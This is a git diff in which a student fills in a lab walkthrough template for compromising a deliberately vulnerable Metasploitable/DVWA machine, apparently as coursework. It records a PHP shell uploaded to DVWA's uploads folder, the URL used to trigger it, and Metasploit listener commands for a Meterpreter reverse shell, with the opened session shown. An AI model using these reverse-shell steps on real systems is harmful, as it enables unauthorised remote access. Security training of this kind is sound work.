@@ -82,10 +82,10 @@ walkthrough-YOURNAME.md
 
 ## 👤 Student Info
 
-- Name:
-- Date:
-- Kali IP:
-- Metasploitable IP:
+- Name: Koda
+- Date: 09/09/2025
+- Kali IP: 192.168.0.201
+- Metasploitable IP: 192.168.0.73
 
 ---
 
@@ -93,15 +93,24 @@ walkthrough-YOURNAME.md
 
 ### 🔹 Foothold Method
 
-- What vulnerability did you use to gain access?
-- What was the payload?
-- Where did you upload it?
-- What URL did you visit to trigger the reverse shell?
+- What vulnerability did you use to gain access? - msfconsole
+- What was the payload? - Payload size: 34926 bytes
+- Where did you upload it? - ../../hackable/uploads/shell.php
+- What URL did you visit to trigger the reverse shell? - http://192.168.0.73/dvwa/hackable/uploads/shell.php
 
 ### 🔹 Listener Details
 
-- What listener did you set up (command)?
-- What session did you receive back?
+- What listener did you set up (command)? - $ msfconsole
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
+payload => php/meterpreter_reverse_tcp
+msf exploit(multi/handler) > set LHOST 192.168.0.201
+LHOST => 192.168.0.201
+msf exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf exploit(multi/handler) > run
+- What session did you receive back? - [*] Meterpreter session 1 opened (192.168.0.201:4444 -> 192.168.0.73:49822) at 2025-09-09 18:17:47 +0800
 - Paste a sample output (e.g. `meterpreter >`)
 
 ---
